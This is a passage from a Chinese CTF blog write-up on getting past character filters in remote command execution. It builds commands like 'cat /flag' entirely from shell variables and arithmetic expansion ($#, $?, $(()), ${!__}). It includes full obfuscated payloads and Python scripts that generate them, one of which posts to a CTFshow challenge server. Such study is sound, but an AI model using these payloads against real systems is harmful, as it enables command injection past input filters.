-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls -l&#x27;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>却报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: line 1: ls -l: command not found</span><br></pre></td></tr></table></figure>
-
-<p>看到这里我测试了一下，如下传参是可以执行的：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;ls /&quot;</span><br></pre></td></tr></table></figure>
-
-<p>我就在想为什么要这样在里面套一对单引号，本来以为是多此一举，想了一下，可能是构造出来的payload在转化完后就是这样的，事实胜于雄辩，直接构造一下看看结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /  ：$&#x27;\154\163\40\57&#x27;  这次这样构造一下</span><br><span class="line">相对应的二进制数为：0b10011010，0b10100011，0b101000 和 0b111001</span><br><span class="line">分别为 $&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$# $&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125; $&#123;##&#125;$#$&#123;##&#125;$#$#$# $&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;</span><br><span class="line">再二进制转十进制，如下：</span><br><span class="line">2:   $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))</span><br><span class="line">154: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">163: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">40:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))</span><br><span class="line">57:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
-
-<p>那么现在如下构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先完成最前面提出的问题，试试$&#x27;\154\163&#x27;能不能使用，如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">结合前面的问题，如下测试：</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;  成功执行ls</span><br><span class="line"></span><br><span class="line">同时注意bash&lt;&lt;&lt;&quot;&#x27;ls&#x27;&quot; 也是可以执行的</span><br></pre></td></tr></table></figure>
-
-<p>这里说明了<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现的<code>$&#39;\154\163&#39;</code>都是可用的，虽然本来就是一样的。</p>
-<p>现在回到原先的问题，刚好证明了，这里使用更简单的构造，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png" alt="image-20240603150736801"></p>
-<p>这个事实就可以充分地说明在这个构造方法中最终利用的payload确实是如文章所说：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls /&#x27;&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>现在结合事实再来想想</strong>，估计就是因为在上面说过的最后结果会被当做字符串，这里为了与shell命令区分开，所以是<code>bash&lt;&lt;&lt;&quot;&#39;ls /&#39;&quot;</code>，中间的单引号表示的就是这是一个字符串，注意思考，区分<code>bash&lt;&lt;&lt;&quot;ls /&quot;</code>这两者的不同</p>
-<p><strong>那现在就继续跟文章</strong></p>
-<p>而出现这个结果的原因应该还是字符串问题，<strong>这阻止了<code>bash</code>用空格分隔参数，</strong></p>
-<p>我们只需使用上述方法运行<code>bash -c</code>，并将最终命令作为参数。这样，<strong>第二次 bash 调用就会进行参数分离</strong>。</p>
-<p>为了在<code>bash</code>和之间放置空格字符<code>-c</code>，我们使用括号扩展：<code>&#123;bash,-c&#125;</code>。这会扩展为带有空格的字符串。</p>
-<p>最终构造地paylaod：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&#123;bash，-c，ls -l&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>那么发散一下，也就是再调用一下bash嘛，那么我尝试再用一次<code>&lt;&lt;&lt;</code>呢</strong>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br><span class="line">注意防止转义</span><br></pre></td></tr></table></figure>
-
-<p>成功执行，<strong>同时注意主要还是用这个</strong></p>
-<h4 id="其它的利用"><a href="#其它的利用" class="headerlink" title="其它的利用"></a>其它的利用</h4><p>其他的博主由此也提出了新的利用方法，参考<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-1">文章</a></p>
-<h5 id="shell脚本中-的多种用法"><a href="#shell脚本中-的多种用法" class="headerlink" title="shell脚本中$的多种用法"></a>shell脚本中$的多种用法</h5><p>shell脚本中<code>$</code>的多种用法（例子可参考<a href="https://blog.csdn.net/ly_qiu/article/details/105765772">文章</a>）：</p>
-<table>
-<thead>
-<tr>
-<th>变量名</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>$0</td>
-<td>脚本本身的名字</td>
-</tr>
-<tr>
-<td>$1</td>
-<td>脚本后所输入的第一串字符</td>
-</tr>
-<tr>
-<td>$2</td>
-<td>传递给该shell脚本的第二个参数</td>
-</tr>
-<tr>
-<td>$*</td>
-<td>脚本后所输入的所有字符</td>
-</tr>
-<tr>
-<td>$@</td>
-<td>脚本后所输入的所有字符</td>
-</tr>
-<tr>
-<td>$_</td>
-<td>表示上一个命令的最后一个参数</td>
-</tr>
-<tr>
-<td>$#</td>
-<td>#脚本后所输入的字符串个数</td>
-</tr>
-<tr>
-<td>$$</td>
-<td>脚本运行的当前进程ID号</td>
-</tr>
-<tr>
-<td>$!</td>
-<td>表示最后执行的后台命令的PID</td>
-</tr>
-<tr>
-<td>$?</td>
-<td>显示最后命令的退出状态，0表示没有错误，其他表示有错误</td>
-</tr>
-</tbody></table>
-<h5 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用<code>$#</code>构造</h5><p>本质就是和上面启程部分说的那个一样，但是有可能<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来，可以将其换一种形式：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png" alt="image-20240603165448778"></p>
-<p>加了变量$__作为过渡，减少了解析的过程。</p>
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>可以使用的脚本:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用 $(()) 构造"></a>利用 $(()) 构造</h5><p>这个刚刚好上面记录到有这个吗，可以使用<code>$(())</code>来构造任意数字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p>自己尝试按照<code>$#</code>那种方法来构造，比如ls</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line"></span><br><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br><span class="line"></span><br><span class="line">相对应的： $((~$((~$(($(())))$((~$(())))))))$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())</span><br><span class="line"></span><br><span class="line">$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p>在终端输出看一下，均成功构造。不要构造了，到后面的加入<code>#</code>运用是错的，但还是可以自己去构造着试试。</p>
-<p>去看了一下<a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow的极限rce的level5</a>，茅塞顿开，<u>我的思维又局限了</u>，已经可以构造出来十进制的字符串了，还干嘛费心费力去转二进制然后回十进制，变通，<strong>强调脑子要变通</strong>，那么就如下构造一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那现在需要的就是1、 5 、4 、6 、3</span><br><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p>再传入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>成功构造出：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png" alt="image-20240603191723486"></p>
-<p>这个同样有字符串那个问题，原因在本篇文章第一次提出这个问题给的参考那里有说，个人理解大概就是对于一个shell变量只进行一次，所以最后构造出来的<code>$&#39;&#39;</code>不会再运行。</p>
-<p>解决方法同样使用两次bash，先试试，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>然后传入成功执行<code>ls</code>，那么如何利用这个构造<code>bash</code>呢，不能只是简单的<code>$</code>+<code>$(())</code>，这样就算传进去也只会导致两个<code>$$</code>执行查看进程的命令，那么该如何构造呢，文章提出了思路：</p>
-<p>我们已知<code>$&#123;!#&#125;</code>输出为bash，结合间接引用<code>$&#123;!var&#125; -间接引用</code>的说明，在这里我们并没有对<code>#</code>这个赋值，却可以输出<code>bash</code>，那么我们是否可以猜测只要是没有值的参数，在这里都可以拿到<code>bash</code>这个输出，测试一下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png" alt="image-20240603203638487"></p>
-<p>在这张图片中，**可以看到<code>$&#123;!?&#125;</code>也是输出的<code>bash</code>**，虽然不知道为什么<code>$&#123;!0&#125;</code>没有输出（可能是因为是数字），但是可以采用第三个方法输出。这三个思路就是文章提出的，个人感觉还是挺精妙的</p>
-<p>所以在这里仅能通过<strong>定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0</strong>，<strong>然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh/bash</code>字符</strong>。两条命令间通过<code>&amp;&amp;(应该也可以使用 ; )</code>进行连接。由于bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。所以这里是<code>__</code>作为变量名。</p>
-<p>最终<code>ls</code>的payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>wc，又是这个问题，宝塔linux本地只能用<code>bash</code>，换到centos跑一下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png" alt="image-20240603204738674"></p>
-<p>成功执行，其他的payload构造也是同理。</p>
-<p>官方wp给了脚本（偷个懒），如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>来看看博主的方法</strong>，<code>$(())</code>对应0，使用自增构造出了1，2这两个数字。</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png" alt="image-20240603165230257"></p>
-<p>payload如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><strong>自增需要抓包后url编码传参</strong></p>
-<p>可以使用脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用 $? 构造"></a>利用 $? 构造</h5><p>正如上面说的，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，需要的值为<code>0</code>、<code>1</code>，2可以由<code>&lt;&lt;</code>得到</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png" alt="image-20240603161335061"></p>
-<p>，这里只要最后的命令的推出状态没有错误就可以得到0，但是1就不能得到了，可以使用自增运算，如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag:</span><br><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><strong>自增运算时传参需要url编码一下。</strong></p>
-<p>利用脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
-
-<p>自增等后面再来研究</p>
